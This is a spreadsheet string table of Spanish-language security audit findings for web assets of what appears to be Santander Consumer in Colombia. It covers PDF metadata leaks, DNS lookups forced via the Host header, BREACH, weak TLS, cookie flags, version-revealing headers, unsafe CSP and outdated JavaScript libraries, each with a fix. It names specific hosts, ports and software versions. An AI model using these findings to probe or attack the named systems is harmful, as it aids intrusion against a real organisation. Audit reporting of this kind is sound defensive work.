    <t>MAN-66546e42c382686af2c855f8</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-005-AP-003</t>
  </si>
  <si>
    <t>Ciertos tipos de ficheros, como imágenes, PDFs o documentos de Microsoft Office almacenan información en forma de metadatos, tales como autor, fecha de creación, nombre de equipo, direccionamiento IP, o tecnologías utilizadas. La aplicación web analizada alberga varios ficheros PDF que contienen metadatos y que proporcionan información interna de nombres de usuario de los empleados. Los endpoints desde los que se pueden descargar los documentos afectados son los siguientes: 
• https://santanderfinancing.com/wp-content/uploads/2022/03/11_08_2021_CODIGO_DE_ETICA_Y_CONDUCTA.pdf 
• https://santanderfinancing.com/wp-content/uploads/2022/03/BSNC-SC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Consumo.pdf 
• https://santanderfinancing.com/wp-content/uploads/2022/08/BSNC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Vehiculo.pdf
En la evidencia pueden observarse los metadatos de “autor” presentes en los documentos “11_08_2021_CODIGO_DE_ETICA_Y_CONDUCTA.pdf”, “BSNC-SC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Consumo.pdf” y “BSNC-Terminos-y-Condiciones-de-Seguros-para-Credito-de-Vehiculo.pdf” los cuales revelan nombres de empleados de la organización</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional, se puede implementar un procedimiento para controlar los documentos a publicar, garantizando que los mismos no contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, en este caso para identificar los empleados que trabajan en esta aplicación. Con esta información, el atacante puede planificar ataques de ingeniería social o Phishing para obtener el control sobre el activo.</t>
  </si>
  <si>
    <t>MAN-66546ee8c382686af2c855f9</t>
  </si>
  <si>
    <t>SCO-24-CNMPA-005-CO-004</t>
  </si>
  <si>
    <t xml:space="preserve">El servidor afectado puede realizar consultas sobre servidores DNS externos. Para ello un atacante necesita forzar al servidor a realizar una consulta a un dominio controlado por el propio atacante. 
Esta consulta se puede forzar de varias maneras como, por ejemplo, forzando al aplicativo a solicitar un recurso en el dominio controlado por el atacante. 
En este caso, el parámetro vulnerable es la cabecera "Host" en cualquier petición que se realice. 
Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo.
Durante las pruebas realizadas se ha comprobado que el servidor realiza una consulta DNS cuando se envían ciertas peticiones HTTP sobre el aplicativo, en este caso en el puerto 4443.
</t>
  </si>
  <si>
    <t>Dado que el servidor remoto realiza una consulta DNS existen ciertos datos del sistema que inició la consulta que quedarían expuestos en el servidor DNS controlado por un atacante. De esta manera, un atacante podría obtener más información sobre el equipo remoto, por ejemplo la dirección IP del mismo. 
Otro riesgo asociado a este tipo de vulnerabilidad es que se puede utilizar el sistema afectado como proxy para el envío de payloads tipo DNS o incluso como proxy en técnicas de exfiltración de datos vía DNS. En ambos casos, la dirección del Servidor DNS del atacante permanece oculta y se mostraría la dirección IP del servidor afectado como originaria del ataque.</t>
  </si>
  <si>
    <t>MAN-665f40043d46490637e0df3d</t>
  </si>
  <si>
    <t>SC0-24-CNMPO-002-CO-004</t>
  </si>
  <si>
    <t>Durante el análisis de las conexiones cifradas se ha podido comprobar que el servidor web ofrece compresión Gzip en sus conexiones.
La herramienta "testssl" que demuestra que el activo es vulnerable a BREACH</t>
  </si>
  <si>
    <t>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cómo se deshabilita la compresión HTTP para Apache y NGINX: 
Deshabilitar compresión en Apache: 
●Deshabilite el módulo mod_deflate utilizando el siguiente comando: 
$ sudo a2dismod deflate 
●Reinicie el servidor: 
$ sudo /etc/init.d/apache2 restart Deshabilitar compresión en NGINX: 
●Establezca la configuración del host con la opción gzip en off: server {
server_name www.example.com;
 listen 443 ssl http2; 
gzip off; 
}</t>
  </si>
  <si>
    <t>MAN-665f405e3d46490637e0dfab</t>
  </si>
  <si>
    <t>SC0-24-CNMPO-002-CO-005</t>
  </si>
  <si>
    <t>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</si>
  <si>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MAN-66621fd73d46490637ec5b38</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-006-CO-005</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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MAN-6673fe08bb0dea0e40f43ace</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-008-AP-001</t>
  </si>
  <si>
    <t>Exposición de ficheros en el directorio cgi-bin</t>
  </si>
  <si>
    <t>La aplicación expone un script en la ruta /cgi-bin/ el cual ha sido descubierto mediante la
herramienta dirsearch, en este caso en el script no se muestra la información sobre las variables
de entorno ni se puede ejecutar código sobre este script.</t>
  </si>
  <si>
    <t>Eliminar o deshabilitar scripts innecesarios o que no se utilicen.</t>
  </si>
  <si>
    <t>La exposición de scripts CGI sin control en el servidor, como /cgi-bin/test-cgi, puede permite a atacantes ejecutar comandos arbitrarios o acceder a datos sensibles, comprometiendo seriamente la seguridad, integridad y disponibilidad del sistema afectado.</t>
  </si>
  <si>
    <t>MAN-6673fe72bb0dea0e40f44da9</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-008-CO-002</t>
  </si>
  <si>
    <t>MAN-6673fee0bb0dea0e40f46116</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-008-CO-003</t>
  </si>
  <si>
    <t>Se recomienda utilizar únicamente protocolos de cifrado robustos como TLS 1.2 o TLS 1.3, y eliminar los protocolos débiles como TLS 1.0 o TLS 1.1. Adicionalmente, se recomienda eliminar todos los algoritmos CBC (Cipher-Block-Chaining) que puedan estar en uso.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</si>
  <si>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MAN-668e29d187e64843c1d54e33</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-CO-003</t>
  </si>
  <si>
    <t>se ha comprobado que se muestra la versión de Apache y de OpenSSL que se está que se está ejecutando en el servidor en la cabecera de respuesta cabeceras de respuesta del servidor. Revelando información interna acerca del tipo de servidor y versión del mismo, así como información de la infraestructura interna de la aplicación a través de la dirección URL https://simplefinance.santanderfinancing.com:4443/SimpleFinance/login</t>
  </si>
  <si>
    <t>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
https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-668e293e87e64843c1d54e32</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-010-AP-002</t>
  </si>
  <si>
    <t>se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el atributo de seguridad "secure". Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS.</t>
  </si>
  <si>
    <t>MAN-5caba75a</t>
  </si>
  <si>
    <t>SCO-22-CNMPA-003-AP-005</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha observado que las cookies asociadas a la gestión de la sesión no tiene aplicado el siguiente atributo de seguridad:
• HttpOnly – este atributo impide el robo de la cookie mediante ataques de Cross-Site-Scripting ya que no permite el acceso a la misma mediante scripts del lado del cliente.</t>
  </si>
  <si>
    <t>Se recomienda proteger los identificadores de sesión mediante el atributo de seguridad "HttpOnly", evitando que se pueda acceder al identificador de sesión desde secuencias de comandos (JavaScript, ActiveX).</t>
  </si>
  <si>
    <t>MAN-09a3724f</t>
  </si>
  <si>
    <t>SCO-22-CNMPA-009-CO-002</t>
  </si>
  <si>
    <t>Exposición de información sensible mediante encabezados</t>
  </si>
  <si>
    <t>https://aliados.santanderconsumer.co</t>
  </si>
  <si>
    <t>Se ha observado la existencia de un recurso asociado a la compañía que expone información sensible acerca de la infraestructura interna de la misma. El servidor utilizado puede ser identificado a través de los encabezados provenientes de la respuesta del servidor.
• Server: Apache.</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible acerca de la infraestructura interna.</t>
  </si>
  <si>
    <t>La recolección de información es, usualmente, el primer paso para realizar un ataque. La exposición de información le provee a un individuo malicioso un mayor conocimiento acerca de la infraestructura y podría ser aprovechada para la planificación de ataques externos sobre los recursos de la compañía.</t>
  </si>
  <si>
    <t>MAN-09a476bc</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-006-CO-005</t>
  </si>
  <si>
    <t>Detección de algoritmos de cifrado en bloques CBC</t>
  </si>
  <si>
    <t>El recurso afectado presenta debilidades en la utilización de cifrados obsoletos (CBC), los cuales corresponden a una vulnerabilidad llamada “Lucky13”.</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de revisar si la configuración observada responde a un requisito de negocio. De lo contrario, se recomienda deshabilitar los cifrados obsoletos. Además, se recomienda revisar los estándares de configuración de los sistemas para asegurarse que las configuraciones TLS están en línea con las políticas de la organización, y asegurarse de que las configuraciones relacionadas sean consistentes con todas las aplicaciones accesibles desde internet.</t>
  </si>
  <si>
    <t>Si la configuración de suites de cifrado no contempla los aspectos mencionados, un atacante o usuario malicioso podría aprovechar las debilidades existentes en la validación de certificados para realizar un ataque de MITM (man-in-the-middle), y posteriormente intentar interceptar información potencialmente sensible.</t>
  </si>
  <si>
    <t>MAN-09a476bd</t>
  </si>
  <si>
    <t>SCO-22-CNMPO-006-CO-006</t>
  </si>
  <si>
    <t>Se ha observado la existencia de un recurso asociado a la compañía que expone información sensible acerca de la infraestructura interna de la misma. A continuación, se detalla la información sensible que fue observada durante el análisis realizado:
La plataforma utilizada y su versión asociada puede ser identificada a través de los encabezados provenientes de la respuesta del servidor.
• Server: Apache 2.4.37 (centos) OpenSSL/1.1.1k</t>
  </si>
  <si>
    <t>Se recomienda analizar la posibilidad de eliminar la información sensible expuesta a través de los recursos mencionados. Además, se recomienda actualizar los estándares de seguridad en el desarrollo y puesta en producción de servicios, de manera tal que contemple los riesgos asociados a la exposición de información sensible acerca de la infraestructura interna, tales como nombres de hosts, direcciones IPs, versiones de software, path internos y nombres de usuarios.</t>
  </si>
  <si>
    <t>La recolección de información es, usualmente, el primer paso para realizar un ataque. La exposición de información le provee a un individuo malicioso un mayor conocimiento acerca de la infraestructura y podría ser aprovechada para la planificación de ataques externos sobre los recursos de la compañía. Además, el conocimiento acerca de las versiones de las plataformas utilizadas le permitiría a un individuo malicioso ejecutar ataques específicos para el software utilizado, incrementando la probabilidad de éxito en los mismos.</t>
  </si>
  <si>
    <t>MAN-6512d2dcf74e327f9d0969fc</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-005</t>
  </si>
  <si>
    <t>Parametrización incorrecta de cabeceras HTTP</t>
  </si>
  <si>
    <t>Al realizar la auditoría sobre el activo santanderfinancing.com:4443, se descubrió que la aplicación web no envía al usuario varias cabeceras HTTP orientadas a la seguridad. Las siguientes cabeceras no están presentes en las respuestas enviadas por el servidor:
• Strict-Transport-Security (HSTS): Fuerza SSL/TLS para todas las visitas posteriores al sitio durante los siguientes segundos máximos (por ejemplo, 1 año = 1536000 s). Ayuda a mitigar los ataques TLS-stripping basados en Man-in-the-Middle.
• X-Content-Type-Options: Bloquea el contenido malicioso ocultado como un tipo MIME incorrecto.
• X-Frame-Options: Notifica al navegador los permisos sobre que dominios pueden cargar las páginas de la aplicación.
• Content-Security-Policy: Define las fuentes permitidas para scripts/imágenes/objetos/media.
• X-XSS-Protection: Previene al navegador del usuario de la ejecución del contenido JavaScript inyectado por un atacante que se vea reflejado en las respuestas de la aplicación.</t>
  </si>
  <si>
    <t>Se recomienda aplicar la siguiente configuración en las cabeceras HTTP: 
• Strict-Transport-Security: 
o maxage 1536000; 
o includeSubdomains considerar la precarga de páginas críticas a través de https://hstspreload.appspot.com/. • X-Content-Type-Options: 
o Nosniff. 
• X-Frame-Options: 
o establezca "deny" si es posible, si se requiere enmarcar dentro del dominio, use "sameorigin”. 
• Content-Security-Policy: 
o default-src https: 'self' 
• X-XSS-Protection: 
o “1; mode=block".</t>
  </si>
  <si>
    <t>Existen varias parametrizaciones incorrectas de cabeceras HTTP que podrían involucrar un vector de amenaza. 
Cada una de las cabeceras tiene un impacto diferente en la aplicación que depende de su propia configuración: 
• Strict-Transport-Security (HSTS): Permite a los servidores web declarar que los navegadores web solo deben interactuar con él mediante conexiones HTTPS seguras; si no estuviera configurado, permite que el navegador interactúe con el servidor a través del protocolo HTTP inseguro. 
• X-Frame-Options: De no configurar correctamente el servidor y/o la aplicación Web para no permitir ataques de Clickjacking, un atacante podría llevar a cabo un secuestro de sesión mediante un previo ataque de phishing para provocar que el usuario legítimo acceda a la página maliciosa. 
• X-Content-Type-Options: Bloquea el contenido malicioso disfrazado de un tipo MIME incorrecto. 
• Content-Security-Policy: Define las fuentes permitidas para scripts/imágenes/objetos/media, si está mal configurado, el contenido malicioso de sitios externos podría cargarse en la aplicación web.
• X-XSS-Protection: Puede permitir a un atacante realizar ataques de tipo XSS en caso de encontrarse un vector de ataque de este tipo. El resultado de este ataque podría ser, la obtención información acerca de tokens de sesión, cookies y demás información sensible que un cliente pueda estar transmitiendo al sitio web.</t>
  </si>
  <si>
    <t>MAN-6512d40df74e327f9d0969fd</t>
  </si>
  <si>
    <t>SC-23-CNMPA-03-CO-006</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que la cabecera “Server” revela información interna acerca del software/framework y versión del mismo utilizado para desarrollar la aplicación a través de las respuestas del servidor.</t>
  </si>
  <si>
    <t>Se recomienda evitar que la aplicación devuelva al usuario información relativa al software/framework y versión utilizado para desarrollar la propia aplicación. Para ello es necesario eliminar las cabeceras de respuesta HTTP, páginas por defecto y mensajes de error que divulguen este tipo de información.
https://blogs.msdn.microsoft.com/varunm/2013/04/23/remove-unwanted-http-response-headers/</t>
  </si>
  <si>
    <t>Conocer la versión y tipo del software o framework utilizado para desarrollar el aplicativo permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-6512e744f74e327f9d096a22</t>
  </si>
  <si>
    <t>SC-23-CNMPO-001-AP-008</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas, se ha observado que las cookies asociadas a la gestión de la sesión no tienen aplicado el atributo de seguridad "secure". Este atributo indica al navegador que sólo incluya la cookie si se envía a través de un canal cifrado como es el caso del protocolo HTTPS.</t>
  </si>
  <si>
    <t>MAN-6512e91ef74e327f9d096a24</t>
  </si>
  <si>
    <t>SC-23-CNMPO-001-CO-010</t>
  </si>
  <si>
    <t>Cabecera Content-Security-Policy mal configurada</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las páginas por defecto revelan información acerca del servidor JBossWS, Entre esta información se incluye el nombre del servidor, puertos que corren servicios en él, versiones de software utilizado, entre otros datos de interés para un atacante.</t>
  </si>
  <si>
    <t>Conocer toda esta información, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas, así como generar ataques más elaborados contra la plataforma.</t>
  </si>
  <si>
    <t>MAN-651adc69f74e327f9d0a09b1</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-008</t>
  </si>
  <si>
    <t>Se ha detectado que el servidor web no incluye la cabecera "Content Security Policy" en las respuestas HTTP del servidor.
La cabecera "Content Security Policy" no se encuentra entre las cabeceras devueltas</t>
  </si>
  <si>
    <t>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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
• Content-Security-Policy: default-src 'self' *.trusted.com Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: 
• &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt;
Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces: 
• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP 
• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>MAN-651adce0f74e327f9d0a09b2</t>
  </si>
  <si>
    <t>SC-23-CNMPA-002-CO-009</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor y páginas por defecto revelan información interna acerca del tipo de servidor y versión del mismo, así como información de la infraestructura interna de la aplicación.</t>
  </si>
  <si>
    <t>1° Fecha:  30/05/2025</t>
  </si>
  <si>
    <t>MAN-651c2bf7f74e327f9d0a2f09</t>
  </si>
  <si>
    <t>SC-23-CNMPA-004-AP-010</t>
  </si>
  <si>
    <t>Se evidencia pueden observarse los metadatos presentes en el documento PDF descargado de la web. En ellos puede verse rutas internas del servidor y los programas utilizados para su creación</t>
  </si>
  <si>
    <t>Se recomienda eliminar toda la información contenida en los metadatos de los documentos generados y/o publicados en la aplicación. De manera adicional se puede implementar un procedimiento para controlar los documentos a publicar, de manera tal de garantizar que los mismos no contengan información sensible de la organización en sus metadatos.</t>
  </si>
  <si>
    <t>La información contenida en los metadatos de los archivos identificados podría ser utilizada por un atacante para obtener un mayor conocimiento de la organización, tecnologías utilizadas e incluso nombres de usuarios. Con esta información el atacante puede planificar ataques más elaborados.</t>
  </si>
  <si>
    <t>MAN-6537dafaf74e327f9d0bf468</t>
  </si>
  <si>
    <t>SC-23-CNMPO-006-CO-004</t>
  </si>
  <si>
    <t>Ausencia de cabecera Content-Security-Policy o mal configurada</t>
  </si>
  <si>
    <t>Se ha detectado que el servidor web no incluye la cabecera "Content Security Policy" en las respuestas HTTP del servidor.
Se ha detectado que el servidor web incluye la cabecera "Content Security Policy" incorrectamente configurada en las respuestas HTTP del servidor. Al incluir las directivas unsafe-inline y unsafe-eval, se permite la ejecución de scripts inline y en formato string, dejando el aplicativo vulnerable ante ataques Cross Site Scripting.</t>
  </si>
  <si>
    <t>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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
• Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: 
• &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt; Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces: 
• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP 
• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>MAN-6543d9b5f74e327f9d0d42ef</t>
  </si>
  <si>
    <t>SC-23-CNMPO-011-CO-001</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que la cabecera “server” de la respuesta revela información interna acerca del tipo de servidor y versión de este en la aplicación a través de la dirección URL aliados.santanderconsumer.co/busca-credito/used-vehicle-service/v1/used-vehicle/validations_lead</t>
  </si>
  <si>
    <t>MAN-66547fe2c382686af2c855ff</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-001-AP-002</t>
  </si>
  <si>
    <t>Cookie sin atributo HttpOnly</t>
  </si>
  <si>
    <t>Durante el ejercicio de intrusión se ha comprobado que el servidor remoto no incluye en las cabeceras de respuesta "Set-Cookie" de la cookie incap_ses_482_2678343’ el atributo “HttpOnly”.</t>
  </si>
  <si>
    <t>MAN-665f3d943d46490637e0ddaa</t>
  </si>
  <si>
    <t>SC0-24-CNMPO-002-VE-002</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación auditada utiliza una versión de DOM Purify con vulnerabilidades públicas asociadas.
Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:
• https://security.snyk.io/package/npm/dompurify/2.0.11
Se ha detectado que la aplicación auditada utiliza una versión de JQuery con vulnerabilidades públicas asociadas.
Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:
• https://security.snyk.io/package/npm/jquery/2.1.0
Se ha detectado que la aplicación auditada utiliza una versión de JQuery UI con vulnerabilidades públicas asociadas.
Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:
• https://security.snyk.io/package/npm/jquery-ui
• https://github.com/michaeldotson/michaeldotson.github.io/issues/1</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión de DOM Purify y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. 
La última versión de DOMPurify puede ser descargada desde la siguiente dirección URL: 
• https://github.com/cure53/DOMPurify 
Se recomienda actualizar la versión de JQuery y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. 
La última versión de JQuery puede ser descargada desde la siguiente dirección URL: 
• https://jquery.com/download/ 
Se recomienda actualizar la versión de JQuery UI y Touch Punch además de establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. 
La última versión de JQuery puede ser descargada desde la siguiente dirección URL: 
• https://jqueryui.com/download/all/</t>
  </si>
  <si>
    <t>MAN-665f3ef63d46490637e0ddb5</t>
  </si>
  <si>
    <t>SC0-24-CNMPO-002-CO-003</t>
  </si>
  <si>
    <t>Durante las pruebas realizadas se ha comprobado que las cabeceras de respuesta del servidor revelan información interna acerca del tipo de servidor y versión del mismo así como información de la infraestructura interna de la aplicación a través de la siguiente dirección URL:
https://bpm.santanderconsumer.co:8001/</t>
  </si>
  <si>
    <t>1° Fecha:28/02/2025
2° Fecha: 30/05/2025</t>
  </si>
  <si>
    <t>MAN-66621cdf3d46490637ec5b35</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-006-CO-002</t>
  </si>
  <si>
    <t>Cabecera Content-Security-Policy incorrectamente configurada</t>
  </si>
  <si>
    <t>Se ha detectado que el servidor web devuelve la cabecera "Content Security Policy" correctamente configurada en las respuestas HTTP del servidor. En el atributo script-src (encargado de controlar los recursos javascript), tiene definidos los atributos unsafe-inline y unsafe-eval, con lo cual permitiría el paso de cualquier ejecución de javascript, incluyendo ataques de tipo Cross Site Scripting.
La cabecera "Content Security Policy" no se encuentra entre las cabeceras devueltas</t>
  </si>
  <si>
    <t>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"Content-Security-Policy" (en ocasiones se observarán menciones de la cabecera X-Content-Security-Policy, pero se trata de una versión antigua y no es necesario configurarla). 
Un ejemplo de configuración de cabecera es el siguiente: 
• Content-Security-Policy: default-src 'self' *.trusted.com 
Alternativamente, el elemento &lt;meta&gt; puede ser usado para configurar una política, por ejemplo: 
• &lt;meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';"&gt; 
Además se recomienda evitar el uso de atributos como unsafe-inline y unsafe-eval.
Para obtener una referencia completa acerca de todas las directivas "Content Security Policy" se recomienda visitar los siguientes enlaces: 
• https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP 
• https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html</t>
  </si>
  <si>
    <t>MAN-66621e093d46490637ec5b36</t>
  </si>
  <si>
    <t>SCO-24-CNMPO-006-VE-003</t>
  </si>
  <si>
    <t>Se ha detectado que la aplicación auditada utiliza una versión de JQuery UI con vulnerabilidades públicas asociadas.
Los detalles de las vulnerabilidades públicas de esta versión se pueden consultar en el siguiente enlace:
https://security.snyk.io/package/npm/jquery-ui/1.12.1</t>
  </si>
  <si>
    <t>Se recomienda actualizar la versión de JQuery UI y establecer una política de actualizaciones o aplicación de parches para tratar evitar posteriores vulnerabilidades. 
La última versión de JQuery UI puede ser descargada desde la siguiente dirección URL: https://jqueryui.com/download/all/</t>
  </si>
  <si>
    <t>Se detectó una configuración de CSP incorrecta.</t>
  </si>
  <si>
    <t>Warm</t>
  </si>
  <si>
    <t>bpm.santanderconsumer.co</t>
  </si>
  <si>
    <t>Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave "inseguras" ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico.
Directiva: script-src
Valor: 'unsafe-inline'
Directiva: script-src
Valor: 'unsafe-eval'
Directiva: default-src
Valor: data:</t>
  </si>
  <si>
    <t>Recomendamos revisar la CSP de cada sitio web para que sea eficaz en el cumplimiento de los objetivos de seguridad definidos para la Política de Seguridad de Contenido, como: Prevenir la carga de recursos de contenido y scripts no autorizados. Prevenir el clickjacking y otros ataques de marcos anidados. Asegurarse de que los formularios web y los enlaces se comporten como se espera. Específicamente para esta evaluación, nos estamos enfocando principalmente en prevenir ataques de Cross Site Scripting. Por lo tanto, para obtener una calificación BUENA, es suficiente: Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en directivas de origen.</t>
  </si>
  <si>
    <t>unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros.
'unsafe-eval' permite la ejecución de código inyectado en las API DOM como eval().
datos: el URI en default-src permite la ejecución de scripts inseguros.</t>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Se detectó una configuración de CSP incorrecta.
Una política de seguridad de contenido (CSP) correctamente configurada puede ayudar a prevenir ataques de secuencias de comandos entre sitios (XSS) al restringir los orígenes de JavaScript, CSS y otros recursos potencialmente peligrosos. Una CSP adecuada debería: Implementar directivas que establezcan restricciones de fuentes válidas desde donde el cliente puede cargar marcos y secuencias de comandos, así como limitar dónde el cliente puede enviar datos de formularios. Restringir los complementos y especificar un recurso válido para informar sobre infracciones de políticas. No contener palabras clave "inseguras" ni incluir comodines que sean ineficaces para restringir las fuentes. Para esta evaluación, nos centraremos en el objetivo más esencial de una buena política de seguridad de contenido, que es prevenir los ataques de secuencias de comandos entre sitios y la inyección de contenido dinámico.
Directiva: script-src
Valor: </t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>unsafe-inline'</t>
    </r>
  </si>
  <si>
    <r>
      <t xml:space="preserve">Recomendamos revisar la CSP de cada sitio web para que sea eficaz en el cumplimiento de los objetivos de seguridad definidos para la Política de Seguridad de Contenido, como: Prevenir la carga de recursos de contenido y scripts no autorizados. Prevenir el clickjacking y otros ataques de marcos anidados. Asegurarse de que los formularios web y los enlaces se comporten como se espera. Específicamente para esta evaluación, nos estamos enfocando principalmente en prevenir ataques de Cross Site Scripting. Por lo tanto, para obtener una calificación BUENA, es suficiente: Implementar directivas que establezcan restricciones de origen válidas y completas para cargar contenido dinámico (script-src, object-src, default-src). Evitar el uso de directivas inseguras como 'unsafe-eval' y 'unsafe-inline'. Evitar errores tipográficos o directivas CSP no válidas. Evitar comodines, listas de permitidos basadas en host o esquemas de URL simples como 'HTTP' en directivas de origen.
</t>
    </r>
    <r>
      <rPr>
        <b/>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>unsafe-inline'</t>
    </r>
    <r>
      <rPr>
        <sz val="11"/>
        <color theme="1"/>
        <rFont val="Calibri"/>
        <family val="2"/>
        <scheme val="minor"/>
      </rPr>
      <t>: Permite la ejecución de scripts dentro de la página y controladores de eventos no seguros.</t>
    </r>
  </si>
  <si>
    <t>unsafe-inline' permite la ejecución de scripts dentro de la página y controladores de eventos inseguros.</t>
  </si>
  <si>
    <t>Uso de una o más bibliotecas de JavaScript con vulnerabilidades conocidas</t>
  </si>
  <si>
    <t>CVE-2021-41182
CVE-2022-31160
CVE-2021-41184
CVE-2021-41183</t>
  </si>
  <si>
    <t>Uso de una o más bibliotecas de JavaScript con vulnerabilidades conocidas
Librería: jquery-ui 1.12.1
https://mft.santanderconsumer.co/javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&amp;v=7.0.14</t>
  </si>
  <si>
    <t>Los propietarios de sitios web deben actualizar las bibliotecas JavaScript afectadas a versiones que no estén afectadas por vulnerabilidades conocidas o eliminar esa dependencia de la aplicación web.</t>
  </si>
  <si>
    <t>Portal de la financiera</t>
  </si>
  <si>
    <t>www.santanderconsumer.co</t>
  </si>
  <si>
    <t>Se detectó una configuración de CSP incorrecta.
